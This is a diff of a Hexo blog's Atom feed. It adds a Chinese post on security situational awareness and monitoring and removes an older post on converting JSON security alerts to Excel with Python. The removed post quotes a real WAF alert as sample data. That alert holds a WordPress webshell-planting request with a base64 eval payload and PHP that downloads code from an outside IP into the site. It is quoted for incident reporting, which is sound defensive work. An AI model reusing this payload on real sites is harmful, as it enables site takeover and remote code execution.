@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://xiejava.gitee.io/"/>
-  <updated>2023-12-19T06:15:57.551Z</updated>
+  <updated>2023-12-21T03:14:05.794Z</updated>
   <id>https://xiejava.gitee.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>安全运营之态势感知与监测</title>
+    <link href="https://xiejava.gitee.io/posts/e89ce9ea/"/>
+    <id>https://xiejava.gitee.io/posts/e89ce9ea/</id>
+    <published>2023-12-21T02:45:23.000Z</published>
+    <updated>2023-12-21T03:14:05.794Z</updated>
+    
+    <content type="html"><![CDATA[<p>信息安全是一个动态的过程，操作系统、应用软件、中间件，还有硬件，平台的种类越来越多，技术越来越复杂，稍有不慎就会留下安全隐患和管理漏洞，依靠客户自身的IT资源无论从技术的先进性还是方案的严密性上都越来越难以应对，企业往往由于人手或技术力量的不足，无法自如的处理各种复杂的信息安全问题。针对这种情况，就需要持续对新的安全威胁、安全漏洞进行跟踪、分析和响应。</p><p>安全态势感知与监测是一种基于环境的、动态、整体地洞悉安全风险的能力，它以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。</p><p>目前网络安全态势感知平台系统架构如下：</p><ol><li>海量多元异构数据的汇聚融合技术：在大规模网络中，网络安全数据和日志数据由海量设备和多个应用系统中产生，且这些安全数据和日志数据缺乏统一标准与关联，在此基础上进行数据分析，无法得到全局精准的分析结果。</li><li>数据挖掘与智能分析技术：通过机器学习、大数据分析等技术，实现基于逻辑和知识的推理结果，从已知威胁推演未知威胁，实现对安全威胁事件的预测和判断。</li><li>威胁情报的共享与交换技术：通过建立威胁情报共享与交换平台，实现不同安全厂商、不同组织之间的威胁情报共享与交换，提高安全态势感知的准确性和效率。</li></ol><p>一、安全监控</p><p>安全监控应覆盖网络、安全设备、主机、数据库、应用和中间件的安全和性能监控，具体内容如下：</p><table><thead><tr><th>类型</th><th>内容</th><th>监控方式</th></tr></thead><tbody><tr><td>网络层</td><td>路由器、防火墙、IPS、WAF等</td><td>SNMP、syslog等</td></tr><tr><td>主机层</td><td>Windows2000/XP/2003、Solaris、AIX、HP-UX、Redhat Linux</td><td>SNMP、syslog、专用数据收集代理</td></tr><tr><td>数据库</td><td>Oracle、MS SQL Server、Mysql、ES</td><td>SNMP、syslog、专用数据收集代理</td></tr><tr><td>应用中间件</td><td>WebLogic、WebSphere、Jboss/Tomcat、Apache、IIS</td><td>SNMP、syslog、专用数据收集代理</td></tr></tbody></table><p>一般来说将需要监控的数据统一汇聚到安全态势感知平台，通过平台的采集、汇聚、分析、展现能力，实现对网络安全的统一监控和告警通知。</p><p>二、风险感知</p><p>风险感知是指部署相应的监测措施如态势感知平台，主动发现来自系统内外部的安全风险，具体措施包括数据采集、收集汇聚、特征提取、关联分析、状态感知等。</p><ol><li>数据采集<br>数据采集指对网络环境中各类数据进行采集，为网络异常分析、设备预测性维护等提供数据来源。</li><li>收集汇聚<br>对于数据的收集汇聚主要分为两个方面。一是对网络设备系统及应用系统所产生的安全告警数据进行汇聚，包括产品全生命周期的各类数据的同步采集、管理、存储及查询，为后续过程提供数据来源。二是对全网流量进行监听，并将监听过程中采集到的数据进行汇聚。</li><li>特征提取<br>特征提取是指对数据特征进行提取、筛选、分类、优先级排序、可读等处理，从而实现从数据到信息的转化过程，该过程主要是针对单个设备或单个网络的纵向数据分析。信息主要包括内容和情景两方面，内容指网络流量、告警日志信息等；情景指人员的操作指令、人员访问状态、登录事件、时长等。</li><li>关联分析<br>关联分析基于大数据进行横向大数据分析和多维分析，通过将运行机理、运行环境、操作内容、外部威胁情报等有机结合，利用群体经验预测单个设备的安全情况，或根据历史状况和当前状态的差异进行关联分析，进而发现网络及系统的异常状态。</li><li>状态感知<br>状态感知基于关联分析过程，实现对企业网络运行规律、异常情况、安全目标、安全态势、业务背景等的监测感知，确定安全基线，结合大数据分析等相关技术，发现潜在安全威胁、预测黑客攻击行为。</li></ol><p>为了提高安全态势感知与监测的能力和准确性，还需要采取以下措施：</p><ol><li>加强数据分析和挖掘能力：通过对海量数据进行深入分析和挖掘，发现潜在的安全威胁和漏洞。</li><li>建立威胁情报共享机制：通过建立威胁情报共享机制，实现不同组织之间的信息共享和协同作战。</li><li>加强技术创新和研发：通过加强技术创新和研发，不断推出新的安全防护措施和技术手段，提高安全防护能力。</li><li>加强人员培训和管理：通过加强人员培训和管理，提高人员的安全意识和技能水平，减少人为因素对网络安全的影响。</li></ol><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;信息安全是一个动态的过程，操作系统、应用软件、中间件，还有硬件，平台的种类越来越多，技术越来越复杂，稍有不慎就会留下安全隐患和管理漏洞，依靠客户自身的IT资源无论从技术的先进性还是方案的严密性上都越来越难以应对，企业往往由于人手或技术力量的不足，无法自如的处理各种复杂的信息
+      
+    
+    </summary>
+    
+    
+      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
+    
+      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>安全运营之安全加固和运维</title>
@@ -543,34 +571,6 @@
       
       
         &lt;p&gt;随着中国的各种实力的提高，经常在各种媒体上看到中国与各个国家历年的各种指标数据的对比，为了更清楚的展示历年的发展趋势，有的还做成了动图，看到中国各种指标数据的近年的不断逆袭，心中的自豪感油然而生。今天通过Python来实现matplotlib的动态绘图，将中美两国近年的GD
-      
-    
-    </summary>
-    
-    
-      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
-    
-      <category term="开发" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E5%BC%80%E5%8F%91/"/>
-    
-    
-      <category term="Python" scheme="https://xiejava.gitee.io/tags/Python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Python三行代码实现json转Excel</title>
-    <link href="https://xiejava.gitee.io/posts/213c546f/"/>
-    <id>https://xiejava.gitee.io/posts/213c546f/</id>
-    <published>2023-08-18T06:33:33.000Z</published>
-    <updated>2023-08-18T06:39:21.232Z</updated>
-    
-    <content type="html"><![CDATA[<p>最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。<br>用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。<br>实现如下：</p><h2 id="一、引包"><a href="#一、引包" class="headerlink" title="一、引包"></a>一、引包</h2><p>引入pandas包，pandas写excel依赖openpyxl包所以也到导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas </span><br><span class="line">pip install openpyxl</span><br></pre></td></tr></table></figure><h2 id="二、代码"><a href="#二、代码" class="headerlink" title="二、代码"></a>二、代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">json_data=<span class="string">r'''</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">   "msg": "",</span></span><br><span class="line"><span class="string">   "killChain": "02",</span></span><br><span class="line"><span class="string">   "attackIllustration": "1起恶意盲打木马写入攻击",</span></span><br><span class="line"><span class="string">   "traceSourceFlag": "01",</span></span><br><span class="line"><span class="string">   "riskLevel": "02",</span></span><br><span class="line"><span class="string">   "holeType": "",</span></span><br><span class="line"><span class="string">   "discoveryTime": "2023-08-15 14:36:23",</span></span><br><span class="line"><span class="string">   "disposalMeasure": "01",</span></span><br><span class="line"><span class="string">   "informationSource": "长亭WAF",</span></span><br><span class="line"><span class="string">   "disposalSuggestion": "建议封禁",</span></span><br><span class="line"><span class="string">   "riskLevelPredue": "",</span></span><br><span class="line"><span class="string">   "impactFlag": "02",</span></span><br><span class="line"><span class="string">   "disposalOperateRecord": "WAF封禁",</span></span><br><span class="line"><span class="string">   "serialNo": "ABC123",</span></span><br><span class="line"><span class="string">   "sourceIpBelong": "美国",</span></span><br><span class="line"><span class="string">   "potentialImpact": "无",</span></span><br><span class="line"><span class="string">   "sourceIpType": "04",</span></span><br><span class="line"><span class="string">   "protocalType": "HTTP",</span></span><br><span class="line"><span class="string">   "disposalFlag": "01",</span></span><br><span class="line"><span class="string">   "groupOrderType": "1",</span></span><br><span class="line"><span class="string">   "comment": "通过微步溯源，IP归属地是美国",</span></span><br><span class="line"><span class="string">   "attackDetail": "POST //wp-admin/css/colors/blue/blue.php?wall=ZWNobyBhRHJpdjQ7ZXZhbCgkX1BPU1RbJ3Z6J10pOw== HTTP/1.1\n\nHost: abcd.cn\n\nConnection: keep-alive\n\nAccept-Encoding: gzip, deflate\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n\nUser-Agent: Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36\n\nAccept-Language: en-US,en;q=0.9,fr;q=0.8\n\nCache-Control: max-age=0\n\nreferer: www.google.com\n\nUpgrade-Insecure-Requests: 1\n\nContent-Length: 231\n\nContent-Type: application/x-www-form-urlencoded\n\n\n\nvz=$x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/css/colors/blue/uploader.php','w+'),file_get_contents('http://51.79.124.111/vz.txt'));echo+\"aDriv4\".$x;",</span></span><br><span class="line"><span class="string">   "taskId": "",</span></span><br><span class="line"><span class="string">   "status": ""</span></span><br><span class="line"><span class="string">&#125;'''</span></span><br><span class="line">dic_data = json.loads(json_data,strict=<span class="literal">False</span>)</span><br><span class="line">df_data=pd.DataFrame(dic_data,index=[<span class="number">0</span>])</span><br><span class="line">df_data.to_excel(<span class="string">'attack.xlsx'</span>)</span><br></pre></td></tr></table></figure><p>效果：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230818/json%E8%BD%ACexcel.png" alt="json转excel"></p><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><p>因为attackDetail字段有很多类似\n等的转义符，会导致json解析不成功，在json.loads的时候就会报错。报类似于<br><code>json.decoder.JSONDecodeError: Expecting &#39;,&#39; delimiter: line 50 column 149 (char 1339)</code>的错误。所以需要在字符串前面加<code>r</code>标识来忽略掉转义机制。</p><p>常见的字符串标识<code>u,r,b,f</code></p><ul><li>字符串前加u<br>后面字符串以 Unicode格式进行编码，一般用在中文字符串前面，防止因为源码储存格式问题，导致再次使用时出现乱码。</li><li>字符串前加r<br>去掉反斜杠的转义机制。（特殊字符：即那些，反斜杠加上对应字母，表示对应的特殊含义的，比如最常见的”\n”表示换行，”\t”表示Tab等。 ）</li><li>字符串前加b<br>b前缀表示：后面字符串是bytes 类型。</li><li>字符串前加f<br>以 f 开头表示在字符串内支持大括号内的python 表达式字符串拼接。<br>如：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=<span class="string">'xiejava'</span></span><br><span class="line">outputstr=<span class="string">f'My name is <span class="subst">&#123;name&#125;</span>'</span></span><br><span class="line">print(outputstr)</span><br></pre></td></tr></table></figure><p>输出结果为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is xiejava</span><br></pre></td></tr></table></figure><hr><p>博客地址：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注微信公众号,一起学习、成长！</center></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;最近重保，经常需要通过Excel上报威胁事件。安全设备的告警很多都是json格式的，就需要将json转成Excel。&lt;br&gt;用Python将json转成excel也就三行代码的事，先将json串导入形成字典对象，再通过pandas转成DataFrame直接输出excel。&lt;
       
     
     </summary>
